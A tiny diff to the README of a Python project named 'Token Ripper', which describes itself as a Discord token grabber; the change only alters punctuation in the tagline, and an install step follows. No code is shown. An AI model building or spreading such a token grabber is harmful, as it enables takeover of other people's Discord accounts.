@@ -1,5 +1,5 @@
 <h1 align="center">Token Ripper</h1>
-<p align="center">Discord Token Grabber ~ Written In Python.</p>
+<p align="center">Discord Token Grabber | Written In Python.</p>
 
 # Guide:
 1. PIP install requirements.txt. ("pip install -r requirements.txt").
